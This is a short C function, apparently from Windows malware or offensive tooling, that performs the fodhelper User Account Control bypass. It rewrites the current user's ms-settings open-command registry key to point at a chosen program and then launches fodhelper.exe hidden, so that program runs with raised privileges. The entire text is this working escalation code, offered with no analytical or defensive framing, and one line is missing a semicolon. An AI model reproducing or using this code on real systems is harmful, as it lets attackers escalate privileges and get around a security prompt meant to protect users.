void UAC_bypass(const char *path) {
    HKEY k;
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command")
	RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", 0, 0, 0, KEY_WRITE, 0, &k, 0);
    RegSetValueExA(k, 0, 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
    RegSetValueExA(k, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
    RegCloseKey(k);
	ShellExecuteA(0, "open", "fodhelper.exe", 0, 0, SW_HIDE);

}
// 0, = NULL 